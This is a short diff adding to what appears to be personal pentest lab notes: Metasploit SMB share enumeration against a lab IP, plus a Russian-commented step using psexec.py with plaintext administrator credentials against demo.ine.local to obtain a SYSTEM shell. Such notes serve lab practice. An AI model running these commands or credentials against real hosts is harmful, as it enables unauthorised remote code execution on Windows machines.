@@ -24,3 +24,6 @@ msf6 > run
 msf6 > use auxiliary/scanner/smb/smb_enumshares
 msf6 > set RHOSTS 10.48.181.120
 msf6 > run
+
+# 6. Если знаем админские креды через psexec создается сервис и записывается в админскую шару, после получаем шелл от system
+psexec.py administrator:qwertyuiop@demo.ine.local 
